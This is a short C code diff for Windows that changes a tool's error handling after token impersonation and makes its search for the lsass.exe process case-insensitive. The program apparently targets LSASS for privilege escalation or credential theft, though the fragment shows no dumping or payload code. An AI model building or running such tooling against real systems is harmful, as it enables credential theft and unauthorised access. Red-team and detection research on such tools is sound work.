@@ -57,11 +57,15 @@ int main(void)
         return EXIT_FAILURE;
     }
 
-    if (impersonate_token(hToken)) {
-        printf("Token impersonation success!\n");
-        RevertToSelf();
+    if (!impersonate_token(hToken)) {
+        fprintf(stderr, "Token impersonation failed.\n");
+        CloseHandle(hToken);
+        return EXIT_FAILURE;
     }
     
+    printf("Token impersonation success!\n");
+    
+    RevertToSelf();
     CloseHandle(hToken);
     return EXIT_SUCCESS;
 }
@@ -138,7 +142,7 @@ DWORD find_lsass_procid(void)
     }
 
     do {
-        if (wcscmp(pe32.szExeFile, L"lsass.exe") == 0) {
+        if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
             lsass_procid = pe32.th32ProcessID;
             break;
         }
